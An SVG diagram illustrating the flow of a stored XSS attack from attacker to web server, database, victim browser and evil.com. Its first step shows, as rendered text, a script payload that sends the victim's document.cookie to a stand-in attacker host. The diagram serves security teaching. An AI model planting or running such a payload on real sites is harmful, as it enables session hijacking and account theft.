<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1280 720" font-family="Arial, sans-serif" style="background:var(--bg)">
  <!-- palette: resources/palette_diagram.yaml -->
  <rect x="40" y="40" width="1200" height="580" rx="6" fill="var(--primary-fill)" stroke="var(--primary-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="639.9999" y="74.8" text-anchor="middle" font-size="22.7282" font-weight="bold" fill="var(--text)">Stored XSS Attack Flow</text>
  <text x="75.2941" y="109.6" font-size="15.1521" fill="var(--text-muted)">1. Attacker posts malicious comment:</text>
  <text x="101.7647" y="130.48" font-size="13.8894" fill="var(--danger-accent)">&lt;script&gt;fetch('https://evil.com/steal?c='+document.cookie)&lt;/script&gt;</text>
  <rect x="75.2941" y="150.1999" width="211.7647" height="52.2" rx="6" fill="var(--danger-fill)" stroke="var(--danger-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="181.1764" y="182.6799" text-anchor="middle" font-size="15.1521" font-weight="bold" fill="var(--text)">Attacker</text>
  <rect x="410.5882" y="150.1999" width="229.4118" height="52.2" rx="6" fill="var(--warn-fill)" stroke="var(--warn-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="525.294" y="182.6799" text-anchor="middle" font-size="15.1521" font-weight="bold" fill="var(--text)">Web Server</text>
  <rect x="763.5293" y="150.1999" width="229.4118" height="52.2" rx="6" fill="var(--ok-fill)" stroke="var(--ok-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="878.2353" y="182.6799" text-anchor="middle" font-size="15.1521" font-weight="bold" fill="var(--text)">Database</text>
  <line x1="287.0587" y1="175.72" x2="410.5882" y2="175.72" stroke="var(--danger-border)" stroke-width="2" marker-end="url(#ar6)" />
  <line x1="639.9999" y1="175.72" x2="763.5293" y2="175.72" stroke="var(--danger-border)" stroke-width="2" marker-end="url(#ar6)" />
  <text x="75.2941" y="242.9999" font-size="15.1521" fill="var(--text-muted)">2. Victim views the page with the comment</text>
  <line x1="878.2353" y1="202.4" x2="878.2353" y2="271.9999" stroke="var(--primary-border)" stroke-width="1.8823" />
  <rect x="75.2941" y="271.9999" width="211.7647" height="63.8" rx="6" fill="var(--warn-fill)" stroke="var(--warn-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="181.1764" y="298.6799" text-anchor="middle" font-size="15.1521" font-weight="bold" fill="var(--text)">Victim</text>
  <text x="181.1764" y="318.3999" text-anchor="middle" font-size="13.8894" fill="var(--text-muted)">Browser</text>
  <rect x="410.5882" y="271.9999" width="229.4118" height="63.8" rx="6" fill="var(--warn-fill)" stroke="var(--warn-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="525.294" y="298.6799" text-anchor="middle" font-size="15.1521" font-weight="bold" fill="var(--text)">Web Server</text>
  <text x="525.294" y="318.3999" text-anchor="middle" font-size="13.8894" fill="var(--text-muted)">serves page</text>
  <rect x="763.5293" y="271.9999" width="229.4118" height="63.8" rx="6" fill="var(--ok-fill)" stroke="var(--ok-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="878.2353" y="298.6799" text-anchor="middle" font-size="15.1521" font-weight="bold" fill="var(--text)">Database</text>
  <text x="878.2353" y="318.3999" text-anchor="middle" font-size="13.8894" fill="var(--text-muted)">returns data</text>
  <line x1="410.5882" y1="303.3199" x2="287.0587" y2="303.3199" stroke="var(--primary-border)" stroke-width="2" marker-end="url(#ar6b)" />
  <line x1="763.5293" y1="303.3199" x2="639.9999" y2="303.3199" stroke="var(--primary-border)" stroke-width="2" marker-end="url(#ar6b)" />
  <text x="75.2941" y="376.3999" font-size="15.1521" fill="var(--text-muted)">3. Browser executes the script</text>
  <line x1="181.1764" y1="335.7999" x2="181.1764" y2="399.5999" stroke="var(--danger-border)" stroke-width="1.8823" />
  <rect x="75.2941" y="399.5999" width="317.6471" height="63.8" rx="6" fill="var(--danger-fill)" stroke="var(--danger-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="234.1176" y="426.28" text-anchor="middle" font-size="15.1521" font-weight="bold" fill="var(--text)">evil.com</text>
  <text x="234.1176" y="449.48" text-anchor="middle" font-size="13.8894" fill="var(--text-muted)">receives session cookie</text>
  <text x="445.8823" y="434.4" font-size="15.1521" fill="var(--danger-accent)">4. Cookie sent to attacker</text>
  <defs>
    <style id="palette-vars">
      :root, svg {
        --bg: #ffffff;
        --surface: #f5f5f5;
        --border: #e0e0e0;
        --text: #212121;
        --text-muted: #555555;
        --text-faint: #888888;
        --code-bg: #1a1a2e;
        --shadow: #00000022;
        --black: #000000;
        --primary-fill: #2196f3;
        --primary-border: #1565c0;
        --primary-text: #ffffff;
        --primary-accent: #0d47a1;
        --ok-fill: #4caf50;
        --ok-border: #2e7d32;
        --ok-text: #ffffff;
        --ok-accent: #1b5e20;
        --warn-fill: #ff9800;
        --warn-border: #e65100;
        --warn-text: #ffffff;
        --warn-accent: #bf360c;
        --danger-fill: #e74c3c;
        --danger-border: #c62828;
        --danger-text: #ffffff;
        --danger-accent: #b71c1c;
        --info-fill: #9c27b0;
        --info-border: #6a1b9a;
        --info-text: #ffffff;
        --info-accent: #4a148c;
      }
    </style>
    <!-- Gradients -->
    <linearGradient id="grad-primary" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#2196f3"/>
      <stop offset="100%" stop-color="#1565c0"/>
    </linearGradient>

    <linearGradient id="grad-surface" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#ffffff"/>
      <stop offset="100%" stop-color="#f5f5f5"/>
    </linearGradient>

    <linearGradient id="grad-ok" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#4caf50"/>
      <stop offset="100%" stop-color="#2e7d32"/>
    </linearGradient>

    <linearGradient id="grad-warn" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#ff9800"/>
      <stop offset="100%" stop-color="#e65100"/>
    </linearGradient>

    <linearGradient id="grad-danger" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#e74c3c"/>
      <stop offset="100%" stop-color="#c62828"/>
    </linearGradient>

    <linearGradient id="grad-info" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#9c27b0"/>
      <stop offset="100%" stop-color="#6a1b9a"/>
    </linearGradient>

    <!-- Drop shadow -->
    <filter id="shadow" x="-4%" y="-8%" width="108%" height="124%">
      <feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#00000022"/>
    </filter>

    <!-- Arrow markers -->
    <marker id="arrow" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#555555"/>
    </marker>
    <marker id="arrow-primary" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#1565c0"/>
    </marker>
    <marker id="arrow-ok" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#2e7d32"/>
    </marker>
    <marker id="arrow-warn" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#e65100"/>
    </marker>
    <marker id="arrow-danger" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#c62828"/>
    </marker>
    <marker id="arrow-info" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#6a1b9a"/>
    </marker>
    <marker id="arrow-white" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#ffffff"/>
    </marker>

    <marker id="ar6" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="10" markerHeight="10" orient="auto-start-forward">
      <path d="M 0 0 L 17.7778 6.9231 L 0 13.8462 z" fill="#dc3545" />
    </marker>
    <marker id="ar6b" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="10" markerHeight="10" orient="auto-start-forward">
      <path d="M 0 0 L 17.7778 6.9231 L 0 13.8462 z" fill="#4a90e2" />
    </marker>
  </defs>
</svg>